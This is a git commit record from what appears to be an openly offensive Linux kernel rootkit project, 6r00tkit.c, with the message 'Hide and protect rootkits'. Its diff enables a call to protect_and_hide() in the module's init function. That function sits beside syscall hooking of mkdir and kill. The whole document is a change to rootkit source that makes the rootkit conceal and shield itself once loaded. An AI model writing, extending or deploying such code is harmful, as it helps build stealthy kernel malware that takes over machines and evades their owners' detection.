cad4b9577244ce7c8fbd0a1010a3a3f412148bdd
mauricelambert <50479118+mauricelambert@users.noreply.github.com>
2024-01-02 21:47:20 +0000

    Hide and protect rootkits

--- 6r00tkit.c
+++ 6r00tkit.c
@@ -741,7 +741,7 @@ void symbol_unhooking(struct ftrace_hook *hook) {
 */
 static int __init grootkit_init(void) {
     // printk(KERN_INFO "Protect and hide\n");
-    // protect_and_hide();
+    protect_and_hide();
     // printk(KERN_INFO "mkdir syscall hooking\n");
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
     // printk(KERN_INFO "kill syscall hooking\n");
